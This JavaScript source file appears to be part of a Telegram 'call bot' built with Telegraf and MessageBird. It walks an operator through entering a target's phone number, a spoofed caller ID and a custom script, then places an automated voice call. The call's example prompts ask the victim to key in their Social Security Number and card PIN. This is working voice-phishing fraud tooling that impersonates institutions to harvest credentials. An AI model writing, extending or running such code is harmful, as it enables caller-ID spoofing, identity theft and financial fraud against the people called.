"use strict";
var __awaiter = (this && this.__awaiter) || function(thisArg, _arguments, P, generator) {
  function adopt(value) { return value instanceof P ? value : new P(function(resolve) { resolve(value); }); }
  return new (P || (P = Promise))(function(resolve, reject) {
    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
    step((generator = generator.apply(thisArg, _arguments || [])).next());
  });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.custom = void 0;
const telegraf_1 = require("telegraf");
const constants_1 = require("../utils/constants");
const messagebird_1 = require("../utils/messagebird");
const validateNumber_1 = require("../utils/validateNumber");
let chatId;
const custom = () => [
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    yield ctx.replyWithHTML(`👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${Math.round(Math.random()) ? constants_1.UK_NUM : constants_1.US_NUM})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData = {};
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    if (!ctx.message) {
      yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
      return ctx.scene.leave();
    }
    if (!(0, validateNumber_1.validateNumber)(ctx.message.text)) {
      yield ctx.replyWithHTML(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>\n\n<b><i>~ Custom ~</i></b>`);
      return;
    }
    yield ctx.replyWithHTML(`Good,\n\nReply with your CUSTOM message. Please keep under 160 Characters.\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData.number = ctx.message.text;
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    yield ctx.replyWithHTML(`Okay,\n\nReply with the caller ID 👤\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(ctx.wizard.state.callData.number)
      ? '448081961740'
      : '18882019292'})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData.customMessage = ctx.message.text;
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    if (!(0, validateNumber_1.validateNumber)(ctx.message.text)) {
      yield ctx.replyWithHTML(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>\n\n<b><i>~ Custom ~</i></b>`);
      return;
    }
    yield ctx.replyWithHTML(`Perfect, Reply with custom actions\n\ne.g SSN - Please enter your Social Security Number followed by the pound key.\n\nCard Pin - Please enter your card pin number followed by the pound key.\n\netc...\n\n <b>Please note the format MUST be the same or your call will fail</b>\n\n<b><i>~ Custom ~</i></b>`);
    ctx.wizard.state.callData.callerId = ctx.message.text;
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    var _a, _b, _c, _d;
    if (!ctx.wizard.state.callData.actions) {
      ctx.wizard.state.callData.actions = ctx.message.text;
    }
    if (!ctx.wizard.state.callData) {
      return yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([
        telegraf_1.Markup.button.callback("🎬 Let's go", 'expired'),
      ]));
    }
    const { number, institutionName, callerId, wallet, cardType, askCardInfo, transferNumber, pinType, actions, customMessage, } = ctx.wizard.state.callData;
    if (!actions) {
      yield ctx.reply('Please enter your actions in the format specified above.');
      return;
    }
    let d;
    if (actions) {
      d = actions.split('\n\n').map((b) => {
        try {
          const c = b.split('-');
          if (c.length === 1)
            return;
          return {
            0: c[0].trim(),
            1: c[1].trim(),
          };
        }
        catch (error) {
          ctx.reply('One or more of your actions are in the wrong format. Please fix and send again');
        }
      });
    }
    yield ctx.replyWithHTML(`Calling ${number}\nfrom ${callerId} with Custom Text 📲...\n\n<b><i>~ Custom ~</i></b>`);
    chatId =
      Number(ctx.scene.state.chatId) ||
      ((_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id) ||
      ((_b = ctx.from) === null || _b === void 0 ? void 0 : _b.id) ||
      undefined;
    if (!chatId || chatId !== ((_c = ctx.chat) === null || _c === void 0 ? void 0 : _c.id) || chatId !== ((_d = ctx.from) === null || _d === void 0 ? void 0 : _d.id)) {
      return ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
    }
    yield (0, messagebird_1.messagebirdMakeACall)({
      from: callerId,
      to: number,
      institutionName,
      transferNumber,
      step: 'custom',
      wallet,
      cardType,
      askCardInfo,
      chatId,
      pinType,
      actions: JSON.stringify(d),
      customMessage,
      language: number[0] === `1` ? `en-us` : `en-gb`,
    });
    return ctx.wizard.next();
  }),
];
exports.custom = custom;
